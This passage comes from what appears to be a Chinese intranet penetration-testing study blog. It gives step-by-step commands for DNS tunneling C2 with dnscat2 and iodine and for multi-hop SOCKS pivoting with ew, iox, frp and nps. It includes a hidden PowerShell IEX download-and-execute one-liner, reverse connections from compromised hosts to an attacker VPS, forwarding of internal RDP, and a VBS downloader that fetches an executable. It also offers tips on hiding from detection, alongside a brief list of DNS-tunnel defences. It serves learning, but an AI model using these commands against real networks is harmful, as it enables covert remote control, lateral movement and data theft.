#连接成功后，会提示 Session established!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1699275044658-17.png" alt="图片"></p>
<p>dnscat2 的一些命令</p>
<pre class="line-numbers language-none"><code class="language-none">sessions 或 windows				查看当前会话
session -i 1 或 window -i 1		进入 ID 为 1 的会话
shell							建立交互式会话
exec							远程打开程序。如：exec calc.exe
download						下载文件
help							查看支持的命令
clear							清屏
shutdown						切断当前会话
quit							退出dnscat2控制台
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1699275174836-20.png" alt="图片"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1699275184565-23.png" alt="图片"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106205358489.png" alt="image-20231106205358489"></p>
<h6 id="中继模式">中继模式</h6>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106211109692.png" alt="image-20231106211109692"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106211126997.png" alt="image-20231106211126997"></p>
<pre class="line-numbers language-none"><code class="language-none">#启动服务端
sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open
#-e 指定安全级别，open 表示服务端允许客户端不进行加密
#如果提示Address already in use - bind(2) for &quot;0.0.0.0&quot; port 53，可以关闭systemd-resolved
#sudo systemctl stop systemd-resolved

#启动客户端，这里以 Windows 下的 PowerShell 版为例
start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip
#也可以把导入的命令和开启客户端的命令放在一起。使用IEX加载脚本的方式，在内存中打开dnscat2客户端
powershell.exe -nop -w hidden -c &#123;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;);start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1699276411205-26.png" alt="图片"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106211345649.png" alt="image-20231106211345649"></p>
<h4 id="iodine">iodine</h4>
<p>iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。</p>
<p>iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，<mark>iodine 同样也是分成了直接转发和中继两种模式</mark>。</p>
<p>iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，<mark>iodine 通过 Tap 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中</mark>。</p>
<p>Tap基本介绍：Tun/Tap是一对虚拟网络设备，用于在操作系统中创建虚拟网络接口。这对设备可以用于实现网络隧道、虚拟专用网络（VPN）以及其他网络相关的功能。Tun设备和Tap设备是两种不同类型的虚拟网络设备。Tun设备用于网络层（IP层）数据包的处理，而Tap设备用于数据链路层（以太网层）数据包的处理。<mark>当你创建一个Tun/Tap设备时，你可以配置它们来模拟一个局域网或虚拟网络，使得服务端和客户端可以通过这个虚拟网络进行通信</mark>。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107163235262.png" alt="image-20231107163235262"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107162425346.png" alt="image-20231107162425346"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107162933769.png" alt="image-20231107162933769"></p>
<h5 id="iodine安装">iodine安装</h5>
<p>首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。</p>
<p><mark>在这里要尽可能使用短域名(域名越短，隧道的带宽消耗就越小)</mark></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107163646321.png" alt="image-20231107163646321"></p>
<p>Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install iodine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Windows 可以直接到官网下载，下载地址：<a target="_blank" rel="noopener" href="https://code.kryo.se/iodine/%EF%BC%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%90%8D%E7%A7%B0%E6%98%AF">https://code.kryo.se/iodine/，服务端名称是</a> iodined.exe，客户端是 iodine.exe</p>
<h5 id="iodine使用">iodine使用</h5>
<pre class="line-numbers language-none"><code class="language-none">#服务端一般使用的是 Linux，服务端命令如下
sudo iodined -f -c -P teamssix 192.168.77.1 dc.teamssix.com -DD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107170934898.png" alt="image-20231107170934898"></p>
<pre class="line-numbers language-none"><code class="language-none">#如果客户端使用的也是linux
iodine.exe -f -r -P teamssix dc.teamssix.com
#iodine 有时会自动将 DNS 隧道切换成 UDP 通道，使用 -r 参数可以强制让 iodine 在任何情况下都使用 DNS 隧道

#如果客户端使用的也是windows
#Windows 客户端上除了要有 iodine 相关文件外，还需要安装 tap 网卡驱动程序。这里附一个 tap 网卡驱动程序的下载地址：http:&#x2F;&#x2F;www.qudong51.net&#x2F;qudong&#x2F;981.html
#打开下载好的 tap 网卡驱动程序，一直下一步下一步安装就行。
#然后就可以启动客户端程序了，注意下载下来的 dll 文件要和 exe 在一个目录下，不能只复制一个 exe 到目标主机上，而且要以管理员权限运行下面的命令
.\iodine.exe -f -r -P teamssix dc.teamssix.com

#如果出现 Connection setup complete, transmitting data. 就表示 DNS 隧道就已经建立了
#这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107171323139.png" alt="image-20231107171323139"></p>
<p>假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接到访问内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制</p>
<h4 id="防御DNS隧道攻击的方法">防御DNS隧道攻击的方法</h4>
<ul>
<li>禁止网络中的任何人向外部服务器发送 DNS 请求，只允许与受信任的DNS 服务器通信</li>
<li>虽然没有人会将 TXT解析请求发送给 DNS 服务器，但是dnscat2 和邮件服务器/网关会这样做。因此，可以将邮件服务器/网关列入白名单并阻止传入和传出流量中的 TXT 请求</li>
<li>跟踪用户的 DNS查询次数。如果达到阀值，就生成相应的报告</li>
<li>阻止ICMP</li>
</ul>
<h2 id="6、socks代理">6、socks代理</h2>
<p>常见的网络场景有如下三类：</p>
<ul>
<li>服务器在内网中，可以任意访问外部网络</li>
<li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接</li>
<li>服务器在内网中，对外只开放了部分端口(例如80端口)，且服务器不能访问外部网络</li>
</ul>
<p>socks是一种代理服务，可以简单地将一端的系统连接另一端。socks支持多种协议，包括HTTP、FTP等。socks为socks4和socks5两种类型：<mark>socks4只支持TCP协议；socks5不仅支持TCP／UDP协议，还支持各种身份验证机制等，其标准端口为1080</mark>。socks能够与目标内网计算机进行通信，避免多次使用端口转发。socks代理其实可理解为增强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从socks协议中解析出目标的URL的目标端口，再执行lcx的具体功能。<mark>socks代理工具有很多，在使用时要尽可能选择没有GUI界面的。此外，要尽量选择不需要安装其他依赖软件的socks代理工具，能够支持多平台的工具更佳</mark>。</p>
<p>这里放一张OSI七层网络模型图，用于理解socks协议所处的位置，如下：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240330230644103.png" alt="image-20240330230644103"></p>
<p>根据上图可知，socks运行在会话层，能代理TCP、UDP本身及基于它们之上的协议，但无法代理ICMP（因此通过socks代理是无法ping通谷歌的）。</p>
<p>一些年代久远的工具，现在的杀软基本也都能识别到了，因此在实战中不太推荐 ，更推荐使用 socks 代理工具</p>
<p>常用socks代理工具：</p>
<ul>
<li>ew</li>
<li>termite</li>
<li>frp</li>
<li>nps</li>
<li>sSocks</li>
<li>reGeorg</li>
<li>Neo-reGeorg</li>
<li>SocksCap64</li>
<li>Proxifier</li>
<li>ProxyChains</li>
<li>iox</li>
<li>suo5</li>
</ul>
<p>先理解下正向代理和反向代理的区别：</p>
<ul>
<li>正向代理：主动通过代理访问目标主机，即攻击主机 --&gt;目标主机</li>
<li>反向代理：目标机器通过代理进行主动连接，即目标主机 --&gt;攻击主机</li>
</ul>
<h3 id="ew">ew</h3>
<p>ew 的项目主页：<a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
<p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。下载地址：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107193840415.png" alt="image-20231107193840415"></p>
<p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p>
<h4 id="正向连接">正向连接</h4>
<p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 1080
#会在目标主机的1080端口上架设socks代理服务器，之后使用代理工具配置上这个目标主机公网IP的1080端口即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107194432575.png" alt="image-20231107194432575"></p>
<h4 id="反向连接">反向连接</h4>
<p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了。下面就直接以内网地址作为演示了</p>
<p>在公网 VPS 上执行以下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107195806492.png" alt="image-20231107195806492"></p>
<p>在目标主机上执行以下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d vps_ip -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107195901320.png" alt="image-20231107195901320"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107195934549.png" alt="image-20231107195934549"></p>
<h4 id="作为二级跳板使用-二级网络环境-1">作为二级跳板使用(二级网络环境)1</h4>
<p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p>
<pre class="line-numbers language-none"><code class="language-none">内网主机A（有公网IP）--&gt; 内网主机B --&gt; 内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在内网主机B上，开启正向连接代理</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 4444
#.\ew_for_Win.exe -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在内网主机A上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_tran -l 1080 -f hostB_ip -g 4444
#.&#x2F;ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p>
<h4 id="作为二级跳板使用-二级网络环境-2">作为二级跳板使用(二级网络环境)2</h4>
<p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p>
<pre class="line-numbers language-none"><code class="language-none">VPS --&gt; 内网主机A --&gt; 内网主机B --&gt; 内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在公网 VPS 上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107222543340.png" alt="image-20231107222543340"></p>
<p>表示将 1080 收到的 代理请求转发到 4444 端口上</p>
<p>在内网主机 B 上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 5555
#.\ew_for_Win.exe -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>表示开启 5555 端口的正向代理</p>
<p>在内网主机 A 上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555
lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p>
<p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p>
<h4 id="作为三级跳板使用">作为三级跳板使用</h4>
<p>目前有这样的一个环境，内网主机 A 没有公网 IP ，但是可以访问外网，内网主机 B 不能访问外网，但是可以和 A 相互访问，内网主机 C 能访问内网资源，但是只能和 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p>
<pre class="line-numbers language-none"><code class="language-none">VPS --&gt; 内网主机 A --&gt; 内网主机 B --&gt; 内网主机 C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107223912128.png" alt="image-20231107223912128"></p>
<p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555
lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 5555 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107224007759.png" alt="image-20231107224007759"></p>
<p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d 192.168.7.110 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107224029805.png" alt="image-20231107224029805"></p>
<p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p>
<h3 id="iox-简单易用体积小">iox(简单易用体积小)</h3>
<p>iox项目地址：<a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p>
<p>所有的参数都是统一的。<code>-l/--local</code>意为监听本地端口；<code>-r/--remote</code>意为连接远端主机</p>
<h4 id="端口转发-2">端口转发</h4>
<p>监听 <code>0.0.0.0:8888</code> 和<code>0.0.0.0:9999</code>，将两个连接间的流量转发</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;iox fwd -l 8888 -l 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>监听<code>0.0.0.0:8888</code>，把流量转发到<code>1.1.1.1:9999</code></p>
<pre class="line-numbers language-none"><code class="language-none"># 这可以用于内网端口穿透
.&#x2F;iox fwd -l 8888 -r 1.1.1.1:9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>连接<code>1.1.1.1:8888</code>和<code>1.1.1.1:9999</code>, 在两个连接间转发</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="内网实现socks代理">内网实现socks代理</h4>
<pre class="line-numbers language-none"><code class="language-none"># 公网服务器端
.&#x2F;iox proxy -l 9999 -l 1080 
# 内网被控端
.&#x2F;iox proxy -r 1.1.1.1:9999
# 攻击机设置代理，比如proxychains
proxychains fscan -h 192.168.2.100&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="启用加密">启用加密</h4>
<pre class="line-numbers language-none"><code class="language-none"># 这里演示把内网3389端口转发到VPS
# 被控跳板机端
.&#x2F;iox fwd -r 192.168.2.101:3389 -r *1.1.1.1:8888 -k 656565
# 公网服务器端
.&#x2F;iox fwd -l *8888 -l 3389 -k 656565<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="frp-推荐">frp(推荐)</h3>
<p>frp 项目地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp%E3%80%82%E7%9B%B4%E6%8E%A5%E5%9C%A8%E9%A1%B9%E7%9B%AE%E7%9A%84">https://github.com/fatedier/frp。直接在项目的</a> releases 里下载自己对应的系统版本就行</p>
<h4 id="内网端口穿透">内网端口穿透</h4>
<p>场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p>
<p>在 VPS 上开启服务端，这里以 kali 为例，首先修改配置文件 frps.ini</p>
<pre class="line-numbers language-none"><code class="language-none">[common]
bind_port &#x3D; 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后启动服务端</p>
<pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108111609048.png" alt="image-20231108111609048"></p>
<p>配置客户端配置文件</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108111623266.png" alt="image-20231108111623266"></p>
<pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini
2021&#x2F;06&#x2F;09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]
2021&#x2F;06&#x2F;09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]
2021&#x2F;06&#x2F;09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108111723162.png" alt="image-20231108111723162"></p>
<h4 id="建立-socks-代理">建立 socks 代理</h4>
<p>场景：内网主机可出网，想把内网主机作为跳板机使用</p>
<p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p>
<p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p>
<p>在 VPS 上开启服务端，服务端配置文件如下：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108111812380.png" alt="image-20231108111812380"></p>
<blockquote>
<p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p>
</blockquote>
<p>配置好文件后，启动服务端</p>
<pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108111848238.png" alt="image-20231108111848238"></p>
<p>配置客户端文件</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108111906345.png" alt="image-20231108111906345"></p>
<p>开启客户端</p>
<pre class="line-numbers language-none"><code class="language-none">frpc -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini
2021&#x2F;06&#x2F;09 16:11:21 [I] [service.go:304] [ee7ad330ab4e6036] login to server success, get run id [ee7ad330ab4e6036], server udp port [0]
2021&#x2F;06&#x2F;09 16:11:21 [I] [proxy_manager.go:144] [ee7ad330ab4e6036] proxy added: [socks5]
2021&#x2F;06&#x2F;09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108112017198.png" alt="image-20231108112017198"></p>
<p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108112117638.png" alt="image-20231108112117638"></p>
<h3 id="nps-推荐">nps(推荐)</h3>
<p>nps 项目地址：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps%E3%80%82%E7%9B%B8%E8%BE%83%E4%BA%8E">https://github.com/ehang-io/nps。相较于</a> frp，nps 的 web 管理就要强大很多了</p>
<p>nps 不同于 frp 的开箱即用，<mark>nps 的服务端需要安装才能使用</mark>，这里以 kali 下的安装为例</p>
<pre class="line-numbers language-none"><code class="language-none">tar -zxvf linux_amd64_server.tar.gz
.&#x2F;nps install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="建立-socks-代理-2">建立 socks 代理</h4>
<p>启动服务端，默认 Web 管理界面端口 8080</p>
<pre class="line-numbers language-none"><code class="language-none">nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录，不难看出，这 web 界面确实比 frp 的丰富很多。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108112914298.png" alt="image-20231108112914298"></p>
<p>nps 的使用也很简单，界面语言也可选择中文。</p>
<p>首先新增一个客户端，点击 “客户端” --&gt; “新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108112955258.png" alt="image-20231108112955258"></p>
<p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”还能直接看到在客户端上要运行的命令，这个可谓是很贴心了。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108113041062.png" alt="image-20231108113041062"></p>
<p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108113103432.png" alt="image-20231108113103432"></p>
<p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理” --&gt; “新增”，输入客户端的 ID 和代理的端口，然后新增即可。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108113124487.png" alt="image-20231108113124487"></p>
<p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108113218207.png" alt="image-20231108113218207"></p>
<h2 id="7、文件上传与下载">7、文件上传与下载</h2>
<h3 id="常见文件上传与下载手法">常见文件上传与下载手法</h3>
<ul>
<li>
<p>搭建FTP服务器，连接后下载</p>
</li>
<li>
<p>利用VBS脚本下载(主要使用的是 msxm12.xmlhttp 和 adodb.stream 对象)</p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#将以下命令保存到download.vbs文件中
Set Post &#x3D; CreateObject(&quot;Msxm12.XMLHTTP&quot;)
Set Shell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)
Post.Open “GET&quot;，&quot;http:&#x2F;&#x2F;server ip&#x2F;target.exe&quot;,0
